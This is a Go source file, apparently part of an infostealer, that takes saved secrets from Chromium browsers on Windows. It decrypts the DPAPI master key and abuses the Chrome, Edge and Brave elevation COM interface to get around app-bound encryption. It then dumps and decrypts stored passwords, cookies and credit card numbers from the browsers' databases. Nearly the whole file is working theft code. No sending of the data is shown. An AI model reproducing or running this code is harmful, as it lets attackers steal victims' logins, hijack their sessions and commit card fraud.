package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

var (
	clsidChromeElevator = [16]byte{
		0x70, 0x8F, 0xD9, 0x46, 0xD6, 0x5D, 0x5D, 0x47,
		0xA3, 0xE1, 0x52, 0x67, 0x2D, 0xA1, 0xE8, 0x6B,
	}
	iidElevator = [16]byte{
		0x63, 0xB8, 0xFF, 0xC8, 0xE8, 0xD1, 0xCC, 0x4C,
		0x91, 0x6A, 0x9F, 0xEB, 0x9B, 0x6F, 0xB4, 0x56,
	}
	clsidEdgeElevator = [16]byte{
		0x1F, 0xCB, 0xE0, 0x96, 0xBE, 0x27, 0x5E, 0x4A,
		0xA8, 0xB6, 0x33, 0x88, 0xA7, 0xF5, 0x57, 0x6B,
	}
	clsidBraveElevator = [16]byte{
		0x97, 0xEC, 0x72, 0xC4, 0x85, 0xA2, 0xF8, 0x42,
		0xB1, 0x24, 0x6C, 0xBF, 0xAA, 0x85, 0x74, 0x89,
	}
)

type OsCrypt struct {
	EncryptedKey         string `json:"encrypted_key"`
	AppBoundEncryptedKey string `json:"app_bound_encrypted_key"`
}

type LocalStateFile struct {
	OsCrypt OsCrypt `json:"os_crypt"`
}

func GetChromiumMasterKeys(localStatePath string) (dpapiMasterKey []byte, appBoundMasterKey []byte, err error) {
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, nil, fmt.Errorf("ReadFile: %w", err)
	}

	var ls LocalStateFile
	if err := json.Unmarshal(data, &ls); err != nil {
		return nil, nil, fmt.Errorf("json.Unmarshal: %w", err)
	}

	if ls.OsCrypt.EncryptedKey != "" {
		rawKey, err := base64.StdEncoding.DecodeString(ls.OsCrypt.EncryptedKey)
		if err == nil && len(rawKey) > 5 && string(rawKey[:5]) == "DPAPI" {
			dpapiMasterKey, err = dpapiDecrypt(rawKey[5:])
			if err != nil {
				dpapiMasterKey = nil
			}
		}
	}

	if ls.OsCrypt.AppBoundEncryptedKey != "" {
		rawKey, err := base64.StdEncoding.DecodeString(ls.OsCrypt.AppBoundEncryptedKey)
		if err == nil && len(rawKey) > 4 && string(rawKey[:4]) == "APPB" {
			appBoundMasterKey, err = decryptAppBoundKey(rawKey[4:], localStatePath)
			if err != nil {
				appBoundMasterKey = nil
			}
		}
	}

	return dpapiMasterKey, appBoundMasterKey, nil
}

func dpapiDecrypt(ciphertext []byte) ([]byte, error) {
	var inBlob, outBlob dataBlob
	inBlob.cbData = uint32(len(ciphertext))
	inBlob.pbData = &ciphertext[0]

	crypt32 := syscall.NewLazyDLL("crypt32.dll")
	cryptUnprotectData := crypt32.NewProc("CryptUnprotectData")

	ret, _, err := cryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed: %v", err)
	}
	defer localFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))

	result := make([]byte, outBlob.cbData)
	for i := uint32(0); i < outBlob.cbData; i++ {
		result[i] = *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(outBlob.pbData)) + uintptr(i)))
	}
	return result, nil
}

type IElevatorVtbl struct {
	QueryInterface uintptr
	AddRef         uintptr
	Release        uintptr
	RunRecoveryCRX uintptr
	EncryptData    uintptr
	DecryptData    uintptr
}

type IElevator struct {
	Vtbl *IElevatorVtbl
}

func decryptAppBoundKey(appBoundBlob []byte, localStatePath string) ([]byte, error) {
	var clsid [16]byte
	switch {
	case containsCI(localStatePath, "Edge"):
		clsid = clsidEdgeElevator
	case containsCI(localStatePath, "Brave"):
		clsid = clsidBraveElevator
	default:
		clsid = clsidChromeElevator
	}

	ole32 := syscall.NewLazyDLL("ole32.dll")
	coInitialize := ole32.NewProc("CoInitialize")
	coCreateInstance := ole32.NewProc("CoCreateInstance")
	coUninitialize := ole32.NewProc("CoUninitialize")

	coInitialize.Call(0)
	defer coUninitialize.Call()

	var elevator *IElevator
	hr, _, _ := coCreateInstance.Call(
		uintptr(unsafe.Pointer(&clsid)),
		0,
		1,
		uintptr(unsafe.Pointer(&iidElevator)),
		uintptr(unsafe.Pointer(&elevator)),
	)
	if hr != 0 || elevator == nil {
		return nil, fmt.Errorf("CoCreateInstance elevator failed: 0x%08X", uint32(hr))
	}
	defer callRelease(elevator)

	ciphertextBSTR := sysAllocStringByteLen(appBoundBlob)
	if ciphertextBSTR == 0 {
		return nil, fmt.Errorf("sysAllocStringByteLen failed")
	}
	defer sysFreeString(ciphertextBSTR)

	var plaintextBSTR uintptr
	var lastError uint32

	hr, _, _ = syscall.SyscallN(
		elevator.Vtbl.DecryptData,
		uintptr(unsafe.Pointer(elevator)),
		ciphertextBSTR,
		uintptr(unsafe.Pointer(&plaintextBSTR)),
		uintptr(unsafe.Pointer(&lastError)),
	)
	if hr != 0 || plaintextBSTR == 0 {
		return nil, fmt.Errorf("DecryptData failed: 0x%08X (lastError=%d)", uint32(hr), lastError)
	}
	defer sysFreeString(plaintextBSTR)

	bstrLen := sysStringByteLen(plaintextBSTR)
	result := make([]byte, bstrLen)
	for i := uint32(0); i < bstrLen; i++ {
		result[i] = *(*byte)(unsafe.Pointer(plaintextBSTR + uintptr(i)))
	}

	if len(result) > 32 {
		return result[len(result)-32:], nil
	}
	return result, nil
}

func callRelease(elevator *IElevator) {
	if elevator != nil && elevator.Vtbl != nil && elevator.Vtbl.Release != 0 {
		syscall.SyscallN(elevator.Vtbl.Release, uintptr(unsafe.Pointer(elevator)))
	}
}

var (
	oleaut32              = syscall.NewLazyDLL("oleaut32.dll")
	procSysAllocStringLen = oleaut32.NewProc("SysAllocStringByteLen")
	procSysFreeString     = oleaut32.NewProc("SysFreeString")
	procSysStringByteLen  = oleaut32.NewProc("SysStringByteLen")
)

func sysAllocStringByteLen(b []byte) uintptr {
	ret, _, _ := procSysAllocStringLen.Call(
		uintptr(unsafe.Pointer(&b[0])),
		uintptr(uint32(len(b))),
	)
	return ret
}

func sysFreeString(bstr uintptr) {
	if bstr != 0 {
		procSysFreeString.Call(bstr)
	}
}

func sysStringByteLen(bstr uintptr) uint32 {
	ret, _, _ := procSysStringByteLen.Call(bstr)
	return uint32(ret)
}

func DecryptChrome(ciphertext, dpapiMasterKey, appBoundMasterKey []byte) (string, error) {
	if len(ciphertext) < 3 {
		return "", fmt.Errorf("ciphertext too short")
	}

	prefix := string(ciphertext[:3])
	var key []byte

	switch prefix {
	case "v10", "v11":
		key = dpapiMasterKey
	case "v20":
		key = appBoundMasterKey
	default:
		return dpapiDirectDecrypt(ciphertext)
	}

	if len(key) == 0 {
		return "", fmt.Errorf("no master key for %s", prefix)
	}

	if len(ciphertext) < 3+12+16 {
		return "", fmt.Errorf("invalid %s payload len", prefix)
	}

	nonce := ciphertext[3 : 3+12]
	payload := ciphertext[3+12:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("aes.NewCipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("cipher.NewGCM: %w", err)
	}

	plaintext, err := gcm.Open(nil, nonce, payload, nil)
	if err != nil {
		return "", fmt.Errorf("gcm.Open: %w", err)
	}

	return string(plaintext), nil
}

func dpapiDirectDecrypt(data []byte) (string, error) {
	dec, err := dpapiDecrypt(data)
	if err != nil {
		return "", err
	}
	return string(dec), nil
}

type passwordEntry struct {
	URL      string
	Username string
	Password string
}

type cookieEntry struct {
	Host       string
	Name       string
	Value      string
	Path       string
	ExpiresUTC int64
	Secure     bool
}

type cardEntry struct {
	Name     string
	Number   string
	ExpMonth string
	ExpYear  string
}

func extractChromiumLoginsFull(loginDBPath string, dpapKey, appbKey []byte) []passwordEntry {
	tmpDB := loginDBPath + ".tmp_salat"
	if err := copyFile(loginDBPath, tmpDB); err != nil {
		return nil
	}
	defer os.Remove(tmpDB)
	db, err := sql.Open("sqlite3", tmpDB)
	if err != nil {
		return nil
	}
	defer db.Close()
	rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0`)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var entries []passwordEntry
	for rows.Next() {
		var url, user string
		var encPass []byte
		if err := rows.Scan(&url, &user, &encPass); err != nil {
			continue
		}
		pass, _ := DecryptChrome(encPass, dpapKey, appbKey)
		if pass != "" || user != "" {
			entries = append(entries, passwordEntry{
				URL:      url,
				Username: user,
				Password: pass,
			})
		}
	}
	return entries
}

func extractChromiumCookiesFull(cookieDBPath string, dpapKey, appbKey []byte) []cookieEntry {
	tmpDB := cookieDBPath + ".tmp_salat"
	if err := copyFile(cookieDBPath, tmpDB); err != nil {
		return nil
	}
	defer os.Remove(tmpDB)
	db, err := sql.Open("sqlite3", tmpDB)
	if err != nil {
		return nil
	}
	defer db.Close()
	rows, err := db.Query(`SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies`)
	if err != nil {
		rows, err = db.Query(`SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies`)
		if err != nil {
			return nil
		}
	}
	defer rows.Close()

	var entries []cookieEntry
	for rows.Next() {
		var host, name, path string
		var encVal []byte
		var expiresUTC int64
		var isSecure int
		if err := rows.Scan(&host, &name, &encVal, &path, &expiresUTC, &isSecure); err != nil {
			continue
		}
		val, _ := DecryptChrome(encVal, dpapKey, appbKey)
		entries = append(entries, cookieEntry{
			Host:       host,
			Name:       name,
			Value:      val,
			Path:       path,
			ExpiresUTC: expiresUTC,
			Secure:     isSecure == 1,
		})
	}
	return entries
}

func extractChromiumCardsFull(webDataPath string, dpapKey, appbKey []byte) []cardEntry {
	tmpDB := webDataPath + ".tmp_salat"
	if err := copyFile(webDataPath, tmpDB); err != nil {
		return nil
	}
	defer os.Remove(tmpDB)
	db, err := sql.Open("sqlite3", tmpDB)
	if err != nil {
		return nil
	}
	defer db.Close()
	rows, err := db.Query(`SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards`)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var entries []cardEntry
	for rows.Next() {
		var name string
		var encNum []byte
		var expM, expY int
		if err := rows.Scan(&name, &encNum, &expM, &expY); err != nil {
			continue
		}
		num, _ := DecryptChrome(encNum, dpapKey, appbKey)
		entries = append(entries, cardEntry{
			Name:     name,
			Number:   num,
			ExpMonth: fmt.Sprintf("%02d", expM),
			ExpYear:  fmt.Sprintf("%d", expY),
		})
	}
	return entries
}

func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, input, 0644)
}

func containsCI(s, substr string) bool {
	return strings.Contains(strings.ToLower(s), strings.ToLower(substr))
}
